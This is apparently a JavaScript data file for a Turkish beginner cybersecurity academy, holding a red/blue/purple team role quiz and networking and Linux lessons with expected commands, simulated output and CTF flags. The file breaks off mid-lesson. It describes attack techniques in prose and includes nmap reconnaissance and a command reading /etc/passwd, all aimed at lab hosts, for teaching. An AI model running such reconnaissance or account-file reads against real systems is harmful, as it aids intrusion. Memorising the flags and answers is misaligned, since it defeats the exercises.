

/**
 * LFL // LOST FROM LIGHT - SİBER AKADEMİ MERKEZİ VERİ VE MÜFREDAT KÜTÜPHANESİ
 * Bu dosya window nesnesine doğrudan bağlanır. fetch() veya CORS gerektirmez.
 */

// 1. ROL TESPİT TESTİ (10 KURUMSAL SENARYO SORUSU)
window.LFL_QUIZ_QUESTIONS = [
    {
        "id": 1,
        "question": "Bir web uygulamasında form alanına tek tırnak (') girdiğinizde veritabanı hata çıktısı aldınız. İlk tepkiniz ne olur?",
        "options": [
            {
                "text": "Hemen UNION tabanlı sorgularla veritabanı şemasını sızdırmaya çalışırım.",
                "team": "red"
            },
            {
                "text": "Uygulama loglarını süzüp WAF kuralı yazar ve parametrik filtrelemeyi devreye alırım.",
                "team": "blue"
            },
            {
                "text": "Bu açığın kurum için oluşturduğu etkiyi modelleyip geliştirici ekibe acil düzeltme yönergesi hazırlarım.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 2,
        "question": "Kurumsal ağda kaynağı bilinmeyen bir IP adresinden iç sunuculara yoğun SYN paketleri ulaşıyor. Ne yaparsınız?",
        "options": [
            {
                "text": "Paketlerin bayrak dağılımını Wireshark ile inceler, firewall üzerinden saldırgan IP bloğunu izole ederim.",
                "team": "blue"
            },
            {
                "text": "Nmap zamanlama bayraklarını (-T2) veya decoy tekniklerini kullanarak tespit edilmeyen tarama simülasyonları tasarlarım.",
                "team": "red"
            },
            {
                "text": "Mevcut IDS kuralının neden erken uyarı vermediğini analiz eder, SIEM korelasyonunu test eden Sigma kuralı yazarım.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 3,
        "question": "Bir Linux sunucuda cron görevlerinin yazılabilir bir bash scriptini root yetkisiyle çalıştırdığını gördünüz.",
        "options": [
            {
                "text": "Scripte reverse shell kodu enjekte ederek doğrudan root yetkilerine yükselirim (Privilege Escalation).",
                "team": "red"
            },
            {
                "text": "Dosya sahipliğini chown root:root ve izinlerini chmod 700 yapar, auditd ile script değişimlerini izlerim.",
                "team": "blue"
            },
            {
                "text": "Yetki yükseltme adımını MITRE T1053 tekniği ile eşleştirip zafiyetin kapatılmasını belgelerim.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 4,
        "question": "Windows sistemlerde bellekten kimlik bilgisi çekme (Mimikatz vb.) girişimleri hakkında odak noktanız nedir?",
        "options": [
            {
                "text": "LSASS prosesine erişip NTLM hash'lerini dökerek pass-the-hash saldırısıyla yana doğru (lateral movement) ilerlemek.",
                "team": "red"
            },
            {
                "text": "Sysmon Event ID 10 ile LSASS belleğine erişen yetkisiz prosesleri algılayıp engelleyen EDR kuralı yazmak.",
                "team": "blue"
            },
            {
                "text": "Saldırıyı izole bir laboratuvarda çalıştırıp SOC ekibinin tespit etme süresini (MTTD) kronometreyle ölçmek.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 5,
        "question": "Kurumda yeni bir mikroservis API'si yayına alınacak. Sizin yaklaşımınız hangisi olur?",
        "options": [
            {
                "text": "Yetkilendirme mekanizmalarını zorlar; IDOR, Broken Object Level Auth (BOLA) ve API anahtarı sızıntısı ararım.",
                "team": "red"
            },
            {
                "text": "API Gateway arkasında Rate Limiting, JWT imza doğrulaması ve güvenli CORS politikalarını kurgularım.",
                "team": "blue"
            },
            {
                "text": "API için STRIDE tehdit modellemesi çıkarır, test senaryolarını hücum ve savunma ekiplerine paylaştırırım.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 6,
        "question": "Ağda şüpheli bir ikili dosyanın (binary) çalıştığından ve C2 bağlantısı kurduğundan şüpheleniliyor.",
        "options": [
            {
                "text": "YARA kuralları ile uç noktalarda statik imza taraması yapar, proses bellek dökümünü Volatility ile alırım.",
                "team": "blue"
            },
            {
                "text": "Dosyayı tersine mühendislikle (Ghidra/IDA) inceleyip komuta kontrol mimarisini ve iletişim protokolünü çözerim.",
                "team": "purple"
            },
            {
                "text": "Kendi yazdığım zararlının statik AV ve dinamik davranış analizlerinden (EDR) nasıl kaçacağını test ederim.",
                "team": "red"
            }
        ]
    },
    {
        "id": 7,
        "question": "Şirket personeline yönelik sosyal mühendislik ve oltalama (phishing) simülasyonu yapılacak.",
        "options": [
            {
                "text": "Gophish ile gerçekçi sahte intranet portalı klonlar, iki faktörlü kimlik doğrulamayı atlatacak reverse proxy senaryoları kurarım.",
                "team": "red"
            },
            {
                "text": "Gelen posta sunucusunda SPF, DKIM, DMARC kontrollerini sıkılaştırır ve ekli dosyaları sandbox havuzuna alırım.",
                "team": "blue"
            },
            {
                "text": "Hem çalışanların tıklama oranını hem de şüpheli maili SOC merkezine bildirme oranını ölçüp farkındalık eğitimi hazırlarım.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 8,
        "question": "Ağ trafiğinde uzun ve Base64 kodlanmış DNS TXT sorguları fark ettiniz. Ne düşünürsünüz?",
        "options": [
            {
                "text": "DNS Tünelleme (DNS Tunneling) ile veri sızdırma (exfiltration) tespit ettim; ilgili domaini DNS sinkhole ile izole ederim.",
                "team": "blue"
            },
            {
                "text": "Giden trafiği kısıtlı kurumsal ağlarda güvenlik duvarını aşmak için DNS ve ICMP kanallarını C2 trafiğine dönüştürürüm.",
                "team": "red"
            },
            {
                "text": "Bu tekniği MITRE ATT&CK T1071.004 tekniği ile haritalandırır, DNS sunucu loglarının SIEM korelasyonunu denetlerim.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 9,
        "question": "Active Directory ortamında Kerberoasting saldırısı gerçekleştiğini gördünüz.",
        "options": [
            {
                "text": "SPN atanmış servis hesaplarının TGS biletlerini çekip yerel makineme indirir ve hashcat ile offline kırarım.",
                "team": "red"
            },
            {
                "text": "Windows Security Loglarında Event ID 4769 (RC4 şifreleme istekleri) filtresi yazar, gMSA geçişini zorunlu kılarım.",
                "team": "blue"
            },
            {
                "text": "Active Directory üzerinde yetkili hesapların şifre karmaşıklık politikalarını ve bal küpü (honeytoken) hesaplarını doğrularım.",
                "team": "purple"
            }
        ]
    },
    {
        "id": 10,
        "question": "Kapsamlı bir tatbikat veya sızma testi bittiğinde hazırladığınız raporda en çok neye odaklanırsınız?",
        "options": [
            {
                "text": "Hedef ağda nasıl ilerlediğimi, hangi domain admin haklarını aldığımı gösteren kanıt (POC) adımlarına.",
                "team": "red"
            },
            {
                "text": "Saldırı izlerinin hangi log kaynaklarında belirdiğini ve adli bilişim (forensics) zaman çizelgesine.",
                "team": "blue"
            },
            {
                "text": "Hücum tekniklerinin mevcut savunma kurallarıyla birebir eşleşme tablosuna ve kapatılması gereken boşluklara (Gap Analysis).",
                "team": "purple"
            }
        ]
    }
];

// 2. TÜM ODALAR (RED TEAM, BLUE TEAM VE PURPLE TEAM ODALARI)
window.ACADEMY_ROOMS = [
{
        "id": "starter-01",
        "track": "starter",
        "title": "Ağ Temelleri: IP, MAC & Paket Yolculuğu",
        "level": "0. Temel Altyapı",
        "badge": "NETWORK FOUNDATIONS & IP",
        "theory": "### Ağ Nedir ve Cihazlar Nasıl Konuşur?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nİki kişinin birbirine mektup göndermesini düşünün. Zarfın üzerindeki açık adres (Mahalle, Sokak, Kapı No) **IP Adresidir**. O adresteki kişinin değiştirilemez T.C. Kimlik Numarası ise **MAC Adresidir**. Gönderilen uzun bir mektup tek bir zarfa sığmazsa sayfalar numaralandırılarak ayrı ayrı zarflara (**Paketlere**) konur.\n\nBilgisayar ağları (Network), iki veya daha fazla cihazın veri paylaşmak için birbirine kabloyla veya kablosuz (Wi-Fi) bağlanmasıdır.\n\n#### 1. IP Adresi (İnternet Protokolü):\nİnternetteki her cihazın benzersiz bir mantıksal adresidir (Örn: `192.168.1.45` veya `10.10.1.5`). İki çeşittir:\n* **Dinamik (Değişken) IP:** Modemi yeniden başlattığınızda değişebilir.\n* **Statik (Sabit) IP:** Sunucular için sabittir, asla değişmez.\n\n#### 2. MAC Adresi (Fiziksel Kimlik):\nCihazınızın ağ kartına (Ethernet/Wi-Fi) fabrikada kazınmış 48 bitlik benzersiz donanım kimliğidir (Örn: `00:1A:2B:3C:4D:5E`). Ağ içindeki anahtarlar (Switch), paketleri asıl sahibine ulaştırmak için MAC adreslerini kullanır.\n\n#### 3. Paket Mantığı:\nBir video izlerken veya dosya indirirken veri tek parça akmaz. 1500 baytlık küçük paketlere bölünür. Her paketin başında 'Kimden geldi' ve 'Kime gidiyor' etiketleri (Header) bulunur.",
        "mission": "Kendi ağ kartınızın atanmış IP adresini ve MAC kimliğini terminalde ip a (veya ifconfig) komutuyla listeleyin.",
        "expectedCommand": "ip a",
        "acceptedCommands": [
            "ip a",
            "ip addr",
            "ip address",
            "ifconfig"
        ],
        "hintExplanation": "<p><strong>ip a:</strong> 'ip address' komutunun kısaltmasıdır. Linux sistemlerde bilgisayara bağlı tüm ağ kartlarını, aldıkları yerel IP adreslerini ve donanım MAC adreslerini ekrana döker.</p>",
        "terminalSuccessOutput": "[+] AĞ KARTLARI LİSTELENİYOR:\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n    inet 127.0.0.1/8 scope host lo (Yerel Geri-Dönüş / Localhost)\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP\n    link/ether 08:00:27:fa:41:99 (MAC Donanım Kimliği)\n    inet 192.168.1.105/24 brd 192.168.1.255 scope global dynamic eth0\n[TEBRİKLER] Ağ kartınız ve yerel IP adresiniz başarıyla doğrulandı!\n[FLAG] LFL{starter_ip_mac_packet_journey_discovered}",
        "flag": "LFL{starter_ip_mac_packet_journey_discovered}",
        "nextId": "starter-02"
    },
    {
        "id": "starter-02",
        "track": "starter",
        "title": "Portlar & Servisler: Bilgisayarın 65.535 Kapısı",
        "level": "0. Temel Altyapı",
        "badge": "PORTS & SERVICES ARCHITECTURE",
        "theory": "### Port Nedir ve Neden Vardır?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir iş merkezine (Plaza) gittiniz. Plazanın cadde adresi binanın **IP Adresidir**. Ancak binanın içinde 65.535 farklı ofis odası (**Port**) vardır. 80 numaralı oda Web Restoranı, 22 numaralı oda Yönetici Kasası, 53 numaralı oda ise Danışma/Rehberdir. Hangi kapıyı çalarsanız o servisle muhatap olursunuz.\n\nBir bilgisayarda aynı anda hem web sitesi çalışabilir, hem oyun oynanabilir, hem de Spotify müzik çalabilir. Bu servislerin verilerinin birbirine karışmaması için işletim sistemi her servise bir **Port Numarası** atar (Toplam 1 ile 65.535 arası).\n\n#### En Meşhur Siber Güvenlik Portları:\n* **Port 80 (HTTP):** Standart şifresiz web siteleri.\n* **Port 443 (HTTPS):** Şifreli güvenli web siteleri (SSL/TLS).\n* **Port 22 (SSH):** Güvenli uzaktan komut çalıştırma.\n* **Port 53 (DNS):** İsim sorgulama rehberi.\n* **Port 21 (FTP):** Dosya gönderme ve alma.\n* **Port 445 (SMB):** Windows dosya ve yazıcı paylaşımı.\n* **Port 3389 (RDP):** Windows Uzak Masaüstü ekranı.",
        "mission": "Sisteminizde hangi portların şu an dışarıdan bağlantı beklediğini (LISTEN) ss -tuln komutuyla listeleyin.",
        "expectedCommand": "ss -tuln",
        "acceptedCommands": [
            "ss -tuln",
            "ss -tulpn",
            "netstat -tuln",
            "netstat -an"
        ],
        "hintExplanation": "<p><strong>ss:</strong> 'Socket Statistics' aracıdır, ağ bağlantılarını denetler.</p><p><strong>-t:</strong> TCP portlarını listele.</p><p><strong>-u:</strong> UDP portlarını listele.</p><p><strong>-l:</strong> Yalnızca dinlemede (Listening) olan açık kapıları göster.</p><p><strong>-n:</strong> İsimler yerine doğrudan sayısal port numaralarını yaz (Örn: http yerine 80).</p>",
        "terminalSuccessOutput": "[+] AÇIK DİNLENEN PORTLAR:\nNetid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port\ntcp    LISTEN  0       128            0.0.0.0:22            0.0.0.0:* (SSH Yönetim)\ntcp    LISTEN  0       511            0.0.0.0:80            0.0.0.0:* (Web Servisi)\ntcp    LISTEN  0       511            0.0.0.0:443           0.0.0.0:* (Güvenli HTTPS)\nudp    UNCONN  0       0              0.0.0.0:53            0.0.0.0:* (DNS Çözümleyici)\n[BAŞARILI] Sistemdeki açık kapılar haritalandı!\n[FLAG] LFL{starter_ports_and_services_mapped_ok}",
        "flag": "LFL{starter_ports_and_services_mapped_ok}",
        "nextId": "starter-03"
    },
    {
        "id": "starter-03",
        "track": "starter",
        "title": "DNS Rehberi: Alan Adından IP Adresine Çözümleme",
        "level": "0. Temel Altyapı",
        "badge": "DNS PROTOCOL & RESOLUTION",
        "theory": "### DNS (Domain Name System) Nedir?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nAkıllı telefonunuzun rehberinde arkadaşınız 'Ali'nin ismine tıklarsınız; telefon ise arka planda Ali'nin 10 haneli numarasını arar. Kimse arkadaşlarının 10 haneli telefon numaralarını ezberlemez. DNS, internetin küresel telefon rehberidir. Tarayıcıya `google.com` yazdığınızda DNS bu ismi `142.250.185.206` gibi sunucu numarasına çevirir.\n\n#### DNS Kayıt Türleri:\n* **A Kaydı (IPv4):** Bir alan adını 32-bit IPv4 adresine bağlar (Örn: `lfl.corp -> 10.10.1.5`).\n* **AAAA Kaydı (IPv6):** 128-bit yeni nesil IPv6 adresine bağlar.\n* **CNAME (Takma Ad):** Bir ismi başka bir isme yönlendirir (`www.lfl.corp -> lfl.corp`).\n* **MX (Mail Exchange):** Şirketin e-posta sunucusunun yerini gösterir.\n* **TXT Kaydı:** Metin notları (SPF, DKIM gibi e-posta güvenlik sertifikaları).",
        "mission": "nslookup google.com komutunu kullanarak alan adının hangi gerçek sunucu IP'sine çözümlendiğini sorgulayın.",
        "expectedCommand": "nslookup google.com",
        "acceptedCommands": [
            "nslookup google.com",
            "dig google.com",
            "host google.com"
        ],
        "hintExplanation": "<p><strong>nslookup:</strong> 'Name Server Lookup' aracıdır. Alan adını DNS sunucusuna sorar ve karşılığındaki gerçek IP adresini getirir.</p>",
        "terminalSuccessOutput": "[+] DNS SORGUSU ÇALIŞTIRILIYOR (nslookup google.com)...\nServer:         1.1.1.1 (Cloudflare DNS)\nAddress:        1.1.1.1#53\n\nNon-authoritative answer:\nName:   google.com\nAddress: 142.250.185.206\nAddress: 2a00:1450:4001:828::200e\n[BAŞARILI] Alan adı IP adresine dönüştürüldü!\n[FLAG] LFL{starter_dns_resolution_phonebook_master}",
        "flag": "LFL{starter_dns_resolution_phonebook_master}",
        "nextId": "starter-04"
    },
    {
        "id": "starter-04",
        "track": "starter",
        "title": "Bağlantı Protokolleri: TCP vs UDP & El Sıkışma",
        "level": "0. Temel Altyapı",
        "badge": "TCP 3-WAY HANDSHAKE & ICMP",
        "theory": "### TCP ile UDP Arasındaki Hayati Fark\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\n* **TCP (Garantili Kargo):** İadeli taahhütlü mektuptur. Mektup teslim edilirken alıcı imza atar. Mektup yolda kaybolursa postane hemen yenisini gönderir. (Web siteleri, dosya indirme, e-posta).\n* **UDP (Telsiz Anonsu):** Polis telsizidir. Polis anonsu yapar, karşı taraf o an duydu mu duyulmadı mı beklemez, konuşmaya devam eder. Kaybolan paket tekrar gönderilmez çünkü hız kritiktir. (Canlı yayın, Discord sesli sohbet, online oyunlar).\n\n#### TCP 3-Yollu El Sıkışma (3-Way Handshake):\nİki bilgisayar TCP üzerinden konuşmadan önce 3 aşamalı bir selamlaşma yapar:\n1. **SYN (Synchronize):** İstemci sunucuya 'Seninle bağlantı kurmak istiyorum' der.\n2. **SYN-ACK:** Sunucu 'İsteğini aldım, ben de hazırım' cevabını verir.\n3. **ACK (Acknowledge):** İstemci 'Tamam, anlaştık, veri gönderimine başlıyorum' der ve oturum kurulur.",
        "mission": "ping -c 4 10.10.1.5 komutu ile hedef sunucuya ICMP eko paketleri yollayarak yanıt verip vermediğini test edin.",
        "expectedCommand": "ping -c 4 10.10.1.5",
        "acceptedCommands": [
            "ping -c 4 10.10.1.5",
            "ping -c 3 10.10.1.5",
            "ping 10.10.1.5"
        ],
        "hintExplanation": "<p><strong>ping:</strong> Ağdaki bir cihazın açık ve erişilebilir olup olmadığını test eden en temel araçtır.</p><p><strong>-c 4:</strong> Sürekli sonsuza kadar ping atmak yerine 4 paket gönderip dur demektir.</p>",
        "terminalSuccessOutput": "PING 10.10.1.5 (10.10.1.5) 56(84) bytes of data.\n64 bytes from 10.10.1.5: icmp_seq=1 ttl=64 time=0.452 ms\n64 bytes from 10.10.1.5: icmp_seq=2 ttl=64 time=0.418 ms\n64 bytes from 10.10.1.5: icmp_seq=3 ttl=64 time=0.435 ms\n64 bytes from 10.10.1.5: icmp_seq=4 ttl=64 time=0.399 ms\n\n--- 10.10.1.5 ping istatistikleri ---\n4 packets transmitted, 4 received, 0% packet loss, time 3004ms\n[HEDEF CANLI] 0 paket kaybı ile sunucu yanıt verdi!\n[FLAG] LFL{starter_ping_icmp_handshake_alive}",
        "flag": "LFL{starter_ping_icmp_handshake_alive}",
        "nextId": "starter-05"
    },
    {
        "id": "starter-05",
        "track": "starter",
        "title": "Web Protokolü: HTTP İstekleri, Başlıklar & Durum Kodları",
        "level": "0. Temel Altyapı",
        "badge": "HTTP REQUEST & RESPONSE CODES",
        "theory": "### Web Siteleri Arka Planda Nasıl Haberleşir?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir restorana oturdunuz:\n* Garsona 'Bana tatlı menüsünü getir' demeniz bir **HTTP GET** isteğidir.\n* Garsonun menüyü önünüze koyması **200 OK (Başarılı)** yanıtıdır.\n* 'Bu restoranda sushi var mı?' dediğinizde garsonun 'Bizde öyle bir yemek yok' demesi **404 Not Found (Bulunamadı)** yanıtıdır.\n* Sipariş fişine adınızı ve kredi kartınızı yazıp garsona uzatmanız ise **HTTP POST** isteğidir.\n\n#### En Temel HTTP Durum Kodları:\n* **200 OK:** İstek başarıyla işlendi ve içerik teslim edildi.\n* **301/302 Redirect:** Sayfa başka bir adrese taşındı.\n* **401 Unauthorized:** Giriş yapmadınız, kullanıcı adı/şifre gerekli.\n* **403 Forbidden:** Giriş yaptınız ama bu dosyayı görmeye yetkiniz yok.\n* **404 Not Found:** Böyle bir sayfa ya da dosya sunucuda mevcut değil.\n* **500 Internal Server Error:** Sunucu kodu patladı, arka planda hata oluştu.",
        "mission": "curl -I https://api.lfl.corp/health komutuyla hedef web sunucusunun HTTP başlıklarını (Header) ve durum kodunu çekin.",
        "expectedCommand": "curl -I https://api.lfl.corp/health",
        "acceptedCommands": [
            "curl -I https://api.lfl.corp/health",
            "curl -i https://api.lfl.corp/health",
            "curl --head https://api.lfl.corp/health"
        ],
        "hintExplanation": "<p><strong>curl:</strong> Komut satırından web istekleri atmamızı sağlayan İsviçre çakısıdır.</p><p><strong>-I:</strong> Sitenin tüm HTML gövdesini indirmek yerine sadece sunucunun verdiği yanıt başlığını (HTTP Status & Headers) gösterir.</p>",
        "terminalSuccessOutput": "HTTP/1.1 200 OK\nDate: Sun, 08 Nov 2026 17:35:10 GMT\nContent-Type: application/json; charset=utf-8\nServer: Kestrel (Banner-Redacted)\nX-Frame-Options: DENY\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nLFL-Status: Healthy-ZeroTrust-Active\n\n[DURUM KODU: 200 OK] Sunucu HTTP başlıkları başarıyla analiz edildi!\n[FLAG] LFL{starter_http_status_codes_and_headers_master}",
        "flag": "LFL{starter_http_status_codes_and_headers_master}",
        "nextId": "starter-06"
    },
    {
        "id": "starter-06",
        "track": "starter",
        "title": "Linux Mimarisi: Dizin Hiyerarşisi & Dosya Mantığı",
        "level": "0. Temel Altyapı",
        "badge": "LINUX DIRECTORY HIERARCHY",
        "theory": "### Linux Dünyasında Her Şey Bir Dosyadır\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nWindows işletim sistemi bir apartmandır; C:\\ diski zemin kat, D:\\ diski birinci kattır. Linux ise tek bir devasa ağaçtır. Ağacın en altındaki kök **`/`** simgesidir. Ne varsa bu kökün üzerindeki dallarda asılıdır. Hatta klavyeniz, fareniz ve ağ kartınız bile Linux için `/dev` klasöründe duran bir dosyadan ibarettir!\n\n#### Kritik Linux Klasörleri:\n* **`/bin` & `/usr/bin`:** Sistemde çalıştırabileceğiniz temel programlar (`ls`, `cat`, `nmap` vb.).\n* **`/etc`:** Sistemin ve tüm programların ayar (konfigürasyon) dosyaları.\n* **`/var/log`:** Güvenlik logları ve web sunucu günlükleri (Saldırı delilleri burada toplanır).\n* **`/home`:** Normal kullanıcıların masaüstü ve kişisel belgeleri.\n* **`/root`:** Süper kullanıcı (Root) yöneticisinin özel evi.",
        "mission": "ls -la / komutunu kullanarak kök dizindeki (/) tüm sistem klasörlerini ayrıntılı olarak listeleyin.",
        "expectedCommand": "ls -la /",
        "acceptedCommands": [
            "ls -la /",
            "ls -l /",
            "ls -a /",
            "ls /"
        ],
        "hintExplanation": "<p><strong>ls:</strong> 'List' kelimesinden gelir, klasör içeriğini listeler.</p><p><strong>-l:</strong> Uzun (long) formatta gösterir; dosya boyutlarını, sahiplerini ve izinlerini yazar.</p><p><strong>-a:</strong> Gizli (nokta ile başlayan) dosyaları da gösterir.</p><p><strong>/:</strong> Bilgisayarın en üst kök dizinini hedefler.</p>",
        "terminalSuccessOutput": "total 64\ndrwxr-xr-x  18 root root  4096 Nov  8 00:00 .\ndrwxr-xr-x  18 root root  4096 Nov  8 00:00 ..\nlrwxrwxrwx   1 root root     7 Nov  8 00:00 bin -> usr/bin\ndrwxr-xr-x   2 root root  4096 Nov  8 00:00 boot\ndrwxr-xr-x   5 root root  4096 Nov  8 00:00 dev\ndrwxr-xr-x 135 root root 12288 Nov  8 00:00 etc (Ayarlar)\ndrwxr-xr-x   3 root root  4096 Nov  8 00:00 home\ndrwx------   8 root root  4096 Nov  8 00:00 root\ndrwxr-xr-x  14 root root  4096 Nov  8 00:00 var (Loglar)\n[BAŞARILI] Linux kök dizin hiyerarşisi başarıyla çözümlendi!\n[FLAG] LFL{starter_linux_root_hierarchy_mapped}",
        "flag": "LFL{starter_linux_root_hierarchy_mapped}",
        "nextId": "starter-07"
    },
    {
        "id": "starter-07",
        "track": "starter",
        "title": "Terminal Büyü Değildir: Dizinler Arasında Gezinme & Filtreleme",
        "level": "0. Temel Altyapı",
        "badge": "TERMINAL CLI & PIPELINE (|)",
        "theory": "### Hackerlar Neden Fare Kullanmaz?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir kütüphanede 10.000 kitap var. Elinizle tek tek raflara bakıp 'içinde siber kelimesi geçen kitapları' bulmak saatler sürer (Grafik arayüz). Ama kütüphane görevlisinin mikrofonuna 'Bana içinde siber geçen kitapları getir' derseniz saniyede önünüze koyar (Terminal komutu).\n\nTerminal büyü değildir; işletim sistemine klavyeyle doğrudan fısıldamaktır.\n\n#### 5 Altın Linux Komutu:\n1. **`pwd` (Print Working Directory):** Şu an hangi klasörün içindeyim?\n2. **`cd` (Change Directory):** Klasör değiştir, içeri gir (`cd /var/log` veya geri çık `cd ..`).\n3. **`cat` (Concatenate):** Bir dosyanın içindeki metni terminal ekranına yazdır.\n4. **`grep`:** Binlerce satır metin içinde kelime arayıp süzen filtre.\n5. **Boru Hattı (`|` Pipe):** Bir komutun çıktısını diğer komutun ağzına doğrudan besler (`cat dosya.txt | grep aranan`).",
        "mission": "cat /etc/passwd | grep root komutunu kullanarak kullanıcılar listesinden yalnızca root hesabını filtreleyin.",
        "expectedCommand": "cat /etc/passwd | grep root",
        "acceptedCommands": [
            "cat /etc/passwd | grep root",
            "grep root /etc/passwd",
            "grep 'root' /etc/passwd"
        ],
        "hintExplanation": "<p><strong>cat /etc/passwd:</strong> Linux sistemindeki kayıtlı kullanıcıların listesini ekrana döker.</p><p><strong>| (Boru Hattı):</strong> İlk komutun dökümünü alıp sonraki komuta gönderir.</p><p><strong>grep root:</strong> Ekrana yüzlerce satır yerine sadece içinde 'root' kelimesi geçen satırı yazdırır.</p>",
        "terminalSuccessOutput": "root:x:0:0:root:/root:/bin/bash\n[FILTRE BAŞARILI] Sistem yöneticisi (UID=0 root) hesabı boru hattı ile filtrelendi!\n[FLAG] LFL{starter_cli_pipeline_cat_grep_unlocked}",
        "flag": "LFL{starter_cli_pipeline_cat_grep_unlocked}",
        "nextId": "starter-08"
    },
    {
        "id": "starter-08",
        "track": "starter",
        "title": "Yetki Güvenliği: Dosya İzinleri (rwx) & chmod 700",
        "level": "0. Temel Altyapı",
        "badge": "FILE PERMISSIONS & PRIVILEGES",
        "theory": "### Kim, Hangi Dosyaya Ne Yapabilir?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nÖzel günlüğünüzü şifreli kasanızda tutmanız **`chmod 700`**'dür (Yalnızca siz açıp okuyabilirsiniz). Günlüğü okulun ilan panosuna asmanız ise **`chmod 777`**'dir (Yoldan geçen herkes okur, sayfayı karalar, yırtıp çöpe atar). Siber güvenlikte en büyük felaketler gereksiz 777 yetkisi vermekten doğar!\n\nLinux'ta her dosyanın 3 aktörü vardır:\n1. **Kullanıcı (u - User):** Dosyayı oluşturan kişi.\n2. **Grup (g - Group):** Dosyaya erişimi olan ekip.\n3. **Diğerleri (o - Others):** Bilgisayardaki geri kalan herkes.\n\n#### İzinlerin Sayısal Karşılığı:\n* **Okuma (r - Read):** `4` puan\n* **Yazma/Değiştirme (w - Write):** `2` puan\n* **Çalıştırma (x - Execute):** `1` puan\n* Toplam: 4 + 2 + 1 = `7` (Tam yetki). `chmod 700 dosya.sh` dediğinizde sahibine 7, grup ve diğerlerine 0 puan vererek dosyayı tamamen kilitlersiniz.",
        "mission": "chmod 700 backup.sh komutunu kullanarak kritik yedekleme dosyasını diğer tüm kullanıcılara kapatın.",
        "expectedCommand": "chmod 700 backup.sh",
        "acceptedCommands": [
            "chmod 700 backup.sh",
            "chmod u=rwx,go= backup.sh"
        ],
        "hintExplanation": "<p><strong>chmod:</strong> 'Change Mode' demektir, dosya erişim haklarını değiştirir.</p><p><strong>700:</strong> Dosyanın sahibine tam okuma/yazma/çalıştırma hakkı (7) verirken, diğer tüm kullanıcılara sıfır (0) yetki vererek dosyayı güvenliğe alır.</p>",
        "terminalSuccessOutput": "[+] İZİNLER GÜNCELLENDİ: backup.sh\nEski İzin: -rwxrwxrwx (777 - GÜVENSİZ!)\nYeni İzin: -rwx------ (700 - ZIRHLI & KORUMALI)\n[FLAG] LFL{starter_chmod_permission_hardening_secured}",
        "flag": "LFL{starter_chmod_permission_hardening_secured}",
        "nextId": "starter-09"
    },
    {
        "id": "starter-09",
        "track": "starter",
        "title": "İlk Siber Araç: Nmap ile Servis & Port Keşfi",
        "level": "0. Temel Altyapı",
        "badge": "NMAP PORT RECONNAISSANCE",
        "theory": "### Nmap (Network Mapper) Nedir?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir dedektifin sokaktaki 50 dükkanın kapı kollarını tek tek yoklayıp deftere '1 numaralı dükkan eczane ve kapısı açık, 2 numaralı dükkan banka ve kapısı kilitli' diye not alması gibidir.\n\nSiber güvenlikte bir sistemi incelemeden önce o sistemin hangi kapılarının (portlarının) açık olduğunu ve arkasında hangi programların çalıştığını bilmemiz gerekir. Nmap, dünyanın en popüler açık kaynak ağ keşif aracıdır.\n\n#### Nmap Temel Bayrakları:\n* **`-sV` (Service Version):** Açık portun arkasındaki programın tam sürümünü öğrenir (Örn: Apache 2.4.41 mi, OpenSSH 8.2 mi?). Saldırganlar sürüme özel zafiyet arar.\n* **`-p` (Port):** Belirli portları tarar (Örn: `-p 80,443`).\n* **`-Pn`:** Ping yanıtı vermeyen gizlenmiş sunucuları doğrudan tarar.",
        "mission": "nmap -sV 10.10.1.5 komutunu kullanarak hedef sunucunun açık servislerini ve sürümlerini tarayın.",
        "expectedCommand": "nmap -sV 10.10.1.5",
        "acceptedCommands": [
            "nmap -sV 10.10.1.5",
            "nmap -sV -p- 10.10.1.5",
            "nmap 10.10.1.5"
        ],
        "hintExplanation": "<p><strong>nmap:</strong> Ağ tarayıcısı komutudur.</p><p><strong>-sV:</strong> Kapının açık olduğunu söylemekle kalmaz, çalışan uygulamanın versiyonunu da tespit eder.</p><p><strong>10.10.1.5:</strong> Hedef sistemin IP adresidir.</p>",
        "terminalSuccessOutput": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for target-node-01 (10.10.1.5)\nHost is up (0.00042s latency).\nNot shown: 996 closed tcp ports\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu\n80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))\n443/tcp open  ssl/http Apache httpd 2.4.52\n8080/tcp open  http-proxy LFL Interactive Gateway v3.2\n\nNmap done: 1 IP address (1 host up) scanned in 1.24 seconds\n[TARAMA TAMAMLANDI] Açık servisler ve sürümler başarıyla listelendi!\n[FLAG] LFL{starter_first_nmap_recon_completed_ok}",
        "flag": "LFL{starter_first_nmap_recon_completed_ok}",
        "nextId": "starter-10"
    },
    {
        "id": "starter-10",
        "track": "starter",
        "title": "Kriptografi Temelleri: Hashing vs Encoding vs Encryption",
        "level": "0. Temel Altyapı",
        "badge": "CRYPTOGRAPHY & HASHING",
